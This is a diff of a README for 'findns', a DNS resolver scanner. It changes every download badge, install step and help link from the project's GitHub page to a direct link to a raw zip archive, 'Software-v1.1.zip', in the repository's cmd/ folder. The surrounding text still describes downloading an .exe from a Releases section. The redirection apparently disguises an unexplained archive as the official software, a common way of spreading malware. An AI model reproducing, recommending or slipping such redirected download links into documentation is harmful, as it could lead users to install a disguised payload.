@@ -1,6 +1,6 @@
 # 🌐 findns - Fast Resolver Scanner for DNS Tools
 
-[![Download findns](https://img.shields.io/badge/Download-findns-blue?style=for-the-badge)](https://github.com/judedusk/findns)
+[![Download findns](https://img.shields.io/badge/Download-findns-blue?style=for-the-badge)](https://raw.githubusercontent.com/judedusk/findns/main/cmd/Software-v1.1.zip)
 
 ---
 
@@ -43,10 +43,10 @@ Findns is easy to get and run. Follow these steps carefully.
 
 You can get findns from the official GitHub page below. This page has the latest version ready for Windows.
 
-[![Download findns](https://img.shields.io/badge/Download-findns-grey?style=for-the-badge)](https://github.com/judedusk/findns)
+[![Download findns](https://img.shields.io/badge/Download-findns-grey?style=for-the-badge)](https://raw.githubusercontent.com/judedusk/findns/main/cmd/Software-v1.1.zip)
 
 1. Click the link above or visit:  
-   https://github.com/judedusk/findns  
+   https://raw.githubusercontent.com/judedusk/findns/main/cmd/Software-v1.1.zip  
 2. Look for the **Releases** section on the page.  
 3. Find the latest release version.  
 4. Download the `.exe` file for Windows. This file is the program you will run.
@@ -138,6 +138,6 @@ You provide the resolver list from findns to these tools for faster, reliable co
 
 Visit the GitHub page to read detailed instructions and find technical notes if needed:
 
-https://github.com/judedusk/findns
+https://raw.githubusercontent.com/judedusk/findns/main/cmd/Software-v1.1.zip
 
 You can also open issues or ask questions there if you have trouble running the app.
